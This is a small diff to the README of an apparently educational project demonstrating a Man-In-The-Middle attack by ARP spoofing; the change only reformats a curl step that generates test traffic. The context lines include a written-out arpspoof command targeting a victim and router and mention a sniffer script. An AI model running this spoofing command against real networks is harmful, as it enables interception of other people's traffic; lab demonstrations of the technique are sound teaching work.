@@ -14,7 +14,8 @@ This project demonstrates a basic Man-In-The-Middle (MITM) attack using ARP spoo
    ```bash
    sudo arpspoof -i eth0 -t [Victim-IP] [Router-IP]
 4. Run Python sniffer script (included in sniffer.py)
-5. Simulate traffic using:  ```bash curl http://[Victim-IP]:3000
+5. Simulate traffic using:  ```bash
+    curl http://[Victim-IP]:3000
 
  Sample output : 
  
